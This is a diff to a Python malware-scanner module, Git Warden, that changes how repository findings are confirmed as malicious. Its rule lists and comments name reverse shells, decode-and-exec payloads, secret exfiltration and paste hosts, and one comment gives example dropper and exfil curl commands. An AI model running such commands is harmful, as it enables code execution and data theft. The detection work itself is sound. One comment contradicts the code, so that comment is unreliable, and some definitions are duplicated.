@@ -32,7 +32,7 @@ from pathlib import Path
 
 from .bash_scanner import BashFinding, scan_repo
 from .content_scanner import scan_content
-from .ioc import IocSet, extract_repo_iocs
+from .ioc import IocSet, extract_repo_iocs, is_attacker_host
 from .manifest_scanner import scan_manifests
 
 log = logging.getLogger(__name__)
@@ -40,11 +40,9 @@ log = logging.getLogger(__name__)
 # OSS scanners orchestrated in Tier-2 (doc 02 3.2). We do not reinvent these.
 _SCANNER_NAMES = ("semgrep", "guarddog", "yara")
 
-CONFIRM_THRESHOLD = 5
-
-# Weights across ALL static scanners (bash + manifest + content). Distinct
-# (category, rule) pairs are summed; a high-signal category is required to
-# confirm so weak recon alone can't reach gold (eval finding #15).
+# Weighted score over distinct (category, rule) pairs -- used for RANKING and run
+# artifacts, not as the confirmation gate (confirmation is the Tier-A/Tier-B
+# signature logic below). Distinct pairs are summed so rule spam can't inflate.
 _CATEGORY_WEIGHTS = {
     # bash Layer-1
     "reverse_shell": 5, "download_exec": 4, "exfiltration": 4, "obfuscation": 4,
@@ -54,73 +52,85 @@ _CATEGORY_WEIGHTS = {
     "install_hook": 5, "network_exfil": 4, "code_execution": 3, "credential_access": 3,
 }
 # Git Warden hunts the FULL attack surface (doc 03): hidden network attacks,
-# enumeration/recon, typosquatting, viral implants -- not just supply-chain
-# payloads. Confirmation uses a two-part model so the whole surface is in scope
-# WITHOUT the tiledesk false positives:
-#
-#   confirmed = a single unambiguous SIGNATURE  OR  a recon->ACTION attack chain
-#
-# A SIGNATURE is a single (category, rule) that is malicious on its own -- a
-# reverse shell, curl|bash, eval(atob(...)), a webhook exfil, an install hook.
-# The CHAIN catches subtler attacks: a recon/collection signal (enumeration,
-# network scan, credential gathering) paired with an ACTION signal (exfil,
-# download-exec, reverse shell, persistence, obfuscation, injection, lateral
-# movement). What made the tiledesk repos benign was the absence of an ACTION
-# phase -- they reference ``.env`` and run ``whoami`` in CI but never exfil,
-# execute untrusted code, or persist. A real implant ACTS on what it gathers.
-# Bare idioms (child_process, exec(), env-var *names*, ``.env`` *references*) are
-# neither a signature nor an action, so they cannot confirm on their own.
-_SIGNATURE_RULES = frozenset({
-    # bash Layer-1 -- unambiguous offensive shell
+# enumeration/recon, typosquatting, viral implants. Every category is DETECTED
+# and SCORED (retained in run artifacts, PRD section 13.1). CONFIRMATION to gold,
+# however, is precision-first (PRD section 5: drop a correct candidate before
+# publishing a false positive): it requires a near-zero-legit-base-rate SIGNATURE.
+# Dual-use idioms that pile up in legitimate dev/security repos -- ``whoami`` in
+# CI, ``nmap`` in a pentest Dockerfile, ``eval "$(tool init)"``, base64 -- are
+# scored but never confirm. A recon->action "chain" was tried and removed: it
+# confirmed legit repos (opencode, PentestGPT) whose recon co-occurs with benign
+# actions; a genuine "recon and report" implant exfils via a real channel, which
+# is itself a signature below.
+# Tier A -- CONFIRM ALONE. Intrinsically malicious even as the sole signal: a
+# reverse shell, decode-and-execute, env dump to the network, a package install
+# hook, process injection, an authorized_keys/shadow grab. Near-zero legitimate
+# base rate, so one is enough.
+_CONFIRM_ALONE_RULES = frozenset({
     ("reverse_shell", "dev-tcp-redirect"), ("reverse_shell", "nc-exec"),
     ("reverse_shell", "bash-i-socket"), ("reverse_shell", "mkfifo-shell"),
-    ("reverse_shell", "python-reverse"),
-    ("download_exec", "curl-pipe-shell"), ("download_exec", "fetch-then-exec"),
-    ("exfiltration", "discord-webhook"), ("exfiltration", "telegram-bot"),
-    ("exfiltration", "archive-then-send"),
     ("obfuscation", "base64-decode-exec"), ("obfuscation", "eval-base64"),
-    ("obfuscation", "hex-escapes"),
-    ("persistence", "cron"), ("persistence", "rc-files"), ("persistence", "systemd"),
-    ("persistence", "authorized-keys"), ("persistence", "rc-local"),
-    ("credential_harvest", "ssh-keys"), ("credential_harvest", "cloud-creds"),
+    ("obfuscation", "hex-escapes"), ("obfuscation", "eval-decoded"),
+    ("obfuscation", "py-decode-exec"), ("obfuscation", "fromcharcode-blob"),
+    ("obfuscation", "hex-blob"),
+    ("credential_access", "env-dump"),
     ("credential_harvest", "shadow-passwd"),
+    ("exfiltration", "secret-exfil"),  # curl/wget posting a secret FILE out
+    ("persistence", "authorized-keys"),
     ("process_injection", "ld-preload"), ("process_injection", "ptrace-mem"),
     ("process_injection", "gdb-attach"),
-    # content scanner -- decode-and-run / exfil signatures
-    ("obfuscation", "eval-decoded"), ("obfuscation", "py-decode-exec"),
-    ("obfuscation", "fromcharcode-blob"), ("obfuscation", "hex-blob"),
-    ("network_exfil", "discord-webhook"), ("network_exfil", "telegram-bot"),
-    ("network_exfil", "paste-exfil"),
-    ("credential_access", "env-dump"),
-    # manifest scanner -- a lifecycle hook is only emitted with a suspicious cmd
     ("install_hook", "npm-preinstall"), ("install_hook", "npm-install"),
     ("install_hook", "npm-postinstall"), ("install_hook", "npm-prepare"),
     ("install_hook", "npm-preuninstall"), ("install_hook", "py-setup-exec"),
 })
-# Recon/collection phase -- "casing the joint." Benign on its own (CI runs
-# ``whoami``; apps read ``.env``); an attack signal only when paired with action.
-_RECON_CATEGORIES = frozenset({
-    "enumeration", "network_scan", "credential_harvest", "credential_access",
+# Tier B -- CORROBORATED. A plausible legitimate version exists (a project's own
+# Discord/Telegram adapter, an ops script reading cloud creds, CI writing a
+# deploy key), so one alone is NOT enough -- two DISTINCT Tier-B signatures must
+# co-occur (e.g. an exfil channel AND credential access). Score is not used to
+# corroborate: a legit Telegram adapter racks up score from ordinary code, which
+# is exactly how the crewhaus/opencode false positives slipped through.
+_CORROBORATED_RULES = frozenset({
+    ("exfiltration", "discord-webhook"), ("exfiltration", "telegram-bot"),
+    ("network_exfil", "discord-webhook"), ("network_exfil", "telegram-bot"),
+    ("network_exfil", "paste-exfil"),
+    ("credential_harvest", "ssh-keys"), ("credential_harvest", "cloud-creds"),
 })
-# Action/egress/control phase -- getting data out, running untrusted code,
-# establishing control, or hiding. Pairing recon with any of these is the chain
-# that distinguishes an implant from a build script.
-_ACTION_CATEGORIES = frozenset({
-    "exfiltration", "network_exfil", "download_exec", "reverse_shell",
-    "install_hook", "persistence", "process_injection", "lateral_movement",
-    "obfuscation",
+# Generic curl/fetch is benign to a reputable host and malicious to an attacker
+# host. ``curl https://sh.rustup.rs | sh`` installs Rust; ``curl http://185.x/a.sh
+# | sh`` is a dropper, and ``curl http://185.x -d "$(whoami)"`` is exfil. To an
+# attacker host these confirm alone; to a reputable host (the opencode/PentestGPT
+# false positives: rustup, bun, nodesource, poetry) they never confirm.
+_HOST_GATED_ALONE = frozenset({
+    ("download_exec", "curl-pipe-shell"), ("download_exec", "fetch-then-exec"),
+    ("exfiltration", "curl-post-data"), ("exfiltration", "archive-then-send"),
 })
-# Idioms too common to drive a chain even though they sit in a recon/action
-# category: a token-NAME reference, bare base64 decode, ``curl -d``, ifconfig.
-# Recorded as findings (context/score) but cannot, on their own, satisfy a phase
-# -- otherwise a legit app that decodes base64 and reads an env var would chain.
-_WEAK_RULES = frozenset({
-    ("credential_harvest", "env-token-grab"),  # references a token's NAME, not theft
-    ("obfuscation", "atob"),                    # bare atob() -- ubiquitous in JS
-    ("obfuscation", "base64-buffer"),           # bare Buffer.from(x,'base64')
-    ("exfiltration", "curl-post-data"),         # curl -d -- common API call idiom
-    ("enumeration", "net-recon"),               # ifconfig/netstat -- common diagnostics
+_URL_HOST = re.compile(r"https?://(?:[^/@\s]*@)?([A-Za-z0-9.\-]+)", re.I)
+_IP_HOST = re.compile(r"^\d{1,3}(?:\.\d{1,3}){3}$")
+# Paste/transfer hosts with near-zero legitimate "pipe to shell" use.
+_PASTE_HOSTS = frozenset({
+    "pastebin.com", "paste.ee", "ix.io", "sprunge.us", "0x0.st", "termbin.com",
+    "transfer.sh", "file.io", "anonfiles.com", "controlc.com", "rentry.co",
 })
+_URL_HOST = re.compile(r"https?://(?:[^/@\s]*@)?([A-Za-z0-9.\-]+)", re.I)
+_IP_HOST = re.compile(r"^\d{1,3}(?:\.\d{1,3}){3}$")
+# Paste/transfer hosts with near-zero legitimate "pipe to shell" use.
+_PASTE_HOSTS = frozenset({
+    "pastebin.com", "paste.ee", "ix.io", "sprunge.us", "0x0.st", "termbin.com",
+    "transfer.sh", "file.io", "anonfiles.com", "controlc.com", "rentry.co",
+})
+
+
+def _fetch_target_suspicious(snippet: str) -> bool:
+    """True if a curl/fetch line targets an attacker host (IP, ephemeral, paste).
+
+    Reputable installer domains (rustup.rs, bun.sh, nodesource.com, ...) are not
+    flagged, so a normal `curl ... | sh` install never confirms.
+    """
+    for host in _URL_HOST.findall(snippet or ""):
+        h = host.lower().rstrip(".")
+        if _IP_HOST.match(h) or h in _PASTE_HOSTS or is_attacker_host(h):
+            return True
+    return False
 # Intent-change categories for RED-TEAM lineage (P1, doc 02 5): a fork of an
 # offensive tool legitimately *has* reverse shells / injection -- that is the
 # tool's purpose, not evidence of weaponization. Only ADDED supply-chain
@@ -311,20 +321,18 @@ def analyze_repo(
     full_name: str,
     *,
     runner=subprocess.run,
-    confirm_threshold: int = CONFIRM_THRESHOLD,
     restrict_paths: set[str] | None = None,
     confirm_categories: frozenset[str] | None = None,
 ) -> Tier2Result:
     """Run Tier-2 STATIC analysis on an already-cloned repo (never executes it).
 
     Combines the bash Layer-1 scanner, the install-hook/manifest scanner, and the
-    JS/Python content scanner, plus the OSS scanners. Confirmation spans the full
-    attack surface via a two-part gate (see module constants): a single
-    unambiguous SIGNATURE, or a recon->ACTION chain. ``restrict_paths`` limits
-    which files count toward confirmation (red-team lineage diverged files, P1);
-    ``confirm_categories`` restricts which categories may count (lineage uses
-    WEAPONIZATION_CATEGORIES so a fork only confirms on added malicious mechanisms,
-    not the tool's own offensive code).
+    JS/Python content scanner, plus the OSS scanners. Confirmation is precision-
+    first (see module constants): one Tier-A signature, or two distinct Tier-B
+    signatures. ``restrict_paths`` limits which files count toward confirmation
+    (red-team lineage diverged files, P1); ``confirm_categories`` restricts which
+    categories may count (lineage uses WEAPONIZATION_CATEGORIES so a fork only
+    confirms on added malicious mechanisms, not the tool's own offensive code).
     """
     findings = scan_repo(root) + scan_manifests(root) + scan_content(root)
     if restrict_paths is not None:
@@ -333,22 +341,26 @@ def analyze_repo(
 
     score = _score_static(findings)
     scanners = {name: _run_external(name, root, runner) for name in _SCANNER_NAMES}
-    # Two-part gate over the full attack surface: a single unambiguous SIGNATURE,
-    # or a recon->ACTION chain (gathering paired with egress/control/evasion). For
-    # red-team lineage, confirm_categories restricts which categories may count so
-    # the tool's own offensive code never confirms -- only ADDED weaponization.
+    # Two-tier signature gate. Tier A confirms alone; Tier B confirms only with a
+    # second signal (score >= threshold). Host-gated curl/fetch rules count only
+    # against an attacker host. For red-team lineage, confirm_categories restricts
+    # which categories may count so the tool's own offensive code never confirms.
     def _ok(category: str) -> bool:
         return confirm_categories is None or category in confirm_categories
 
-    def _phase(f: BashFinding, categories: frozenset[str]) -> bool:
-        return (f.category in categories and (f.category, f.rule) not in _WEAK_RULES
-                and _ok(f.category))
-    signature = any((f.category, f.rule) in _SIGNATURE_RULES and _ok(f.category)
-                    for f in findings)
-    has_recon = any(_phase(f, _RECON_CATEGORIES) for f in findings)
-    has_action = any(_phase(f, _ACTION_CATEGORIES) for f in findings)
-    chain = has_recon and has_action
-    static_confirmed = score >= confirm_threshold and (signature or chain)
+    confirm_alone = False
+    corroborating: set[tuple[str, str]] = set()
+    for f in findings:
+        key = (f.category, f.rule)
+        if not _ok(f.category):
+            continue
+        if key in _CONFIRM_ALONE_RULES or (
+                key in _HOST_GATED_ALONE and _fetch_target_suspicious(f.snippet)):
+            confirm_alone = True
+        elif key in _CORROBORATED_RULES:
+            corroborating.add(key)
+    # Tier A confirms alone; Tier B needs a SECOND distinct Tier-B signature.
+    static_confirmed = confirm_alone or len(corroborating) >= 2
     # Only a MALWARE-SPECIFIC scanner (GuardDog: install hooks/exfil/typosquat;
     # YARA: malware rulesets) may solely confirm. Semgrep runs `--config auto`, a
     # general SAST pass that flags ordinary code smells (e.g. child_process.exec)
@@ -376,7 +388,6 @@ def scan_candidate(
     *,
     clone=clone_repo,
     runner=subprocess.run,
-    confirm_threshold: int = CONFIRM_THRESHOLD,
     restrict_paths: set[str] | None = None,
     confirm_categories: frozenset[str] | None = None,
 ) -> Tier2Result | None:
@@ -397,7 +408,7 @@ def scan_candidate(
                         extra={"context": {"repo": full_name}})
             return None
         return analyze_repo(cloned, full_name, runner=runner,
-                            confirm_threshold=confirm_threshold, restrict_paths=restrict_paths,
+                            restrict_paths=restrict_paths,
                             confirm_categories=confirm_categories)
     finally:
         _force_rmtree(cloned)
